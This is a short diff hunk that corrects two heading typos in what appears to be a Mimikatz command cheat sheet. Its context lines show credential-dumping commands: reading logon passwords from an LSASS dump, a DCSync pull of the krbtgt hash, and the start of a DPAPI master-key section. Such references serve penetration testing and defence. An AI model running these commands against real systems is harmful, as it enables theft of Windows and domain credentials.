@@ -61,13 +61,13 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
 
-### Dump Domain Crednetials (DCSync)
+### Dump Domain Credentials (DCSync)
 No LSASS interaction required. Relies on replication permissions.
 ```mkatz
 lsadump::dcsync /domain:corp.local /user:krbtgt
 ```
 
-### Dump Cred Valuts / DPAPI
+### Dump Cred Vaults / DPAPI
 
 #### Dump DPAPI master keys
 ```mkatz
